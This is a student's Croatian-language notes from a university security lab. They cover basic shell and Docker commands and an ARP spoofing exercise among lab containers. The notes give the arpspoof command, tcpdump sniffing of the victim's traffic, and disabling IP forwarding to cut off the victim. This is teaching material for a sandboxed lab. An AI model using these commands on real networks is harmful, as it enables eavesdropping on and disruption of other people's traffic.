# 1.laboratorijska vjezba

pwd - lokacija gdje se nalazimo trenutno, u kojem repozitoriju

cd - promijeni folder u kojem se nalazimo

mkdir - napravi folder

ls - ispis sadrzaja foldera

klonirali smo repozitorij sa githuba od profesora, u naš folder : git clone [https://github.com/mcagalj/SRP-2021-22](https://github.com/mcagalj/SRP-2021-22)

usli smo u repozitorij SRP-2021-22, zatim u folder arp-spoofing (promijenili smo radni direktorij)

./start.sh - buildanje i pokretanje docker kontejnera

-/stop.sh - zaustavljanje docker kontejnera

docker ps - ispis pokrenutih kontejnera

uname - ime op sustava

hostname - da vidimo gdje smo trenutno sa terminalom

docker ps exec -it sh  - pokretanje interaktivnog shella u station-1

if config -a   - dohvaćanje konfiguracije mrežnog interfejsa (ip i ethernet adresa)

 ping station-2  - provjeravamo je li station-2 na istoj mreži kao i station-1

docker exec -it station-2 sh  - pokretanje interaktivnog shella u station-2

netcat -l -p 9000   - pomoću netcata otvaramo server TCP socket na portu 9000, na kontejneru station-1

netcat station-1 9000   - na kontejneru station-2 pomoću netcata otvaramo client TCP socket na hostname-u station-1 9000

docker exec -it evil-station sh   - pokretanje interaktivnof shella u evil-station kontejneru

tcpdump - sluša na ethernetu

arpspoof -t station-1 station-2  - u kontejneru evil-station pokrećemo arpspoof  (-t target -r host, tj. varamo 1 da smo 2)

pomoću tcpdump-a  kojeg pokrećemo u evil-station pratimo  promet, narušavamo confidentiality

tcpdump -X host station-1 and not arp  - filter
echo 0 > /proc/sys/net/ipv4/ip_forward - naredba evil stationu da ne prosljeđuje, narušen availability (gasimo proslijeđivanje spoofanih paketa)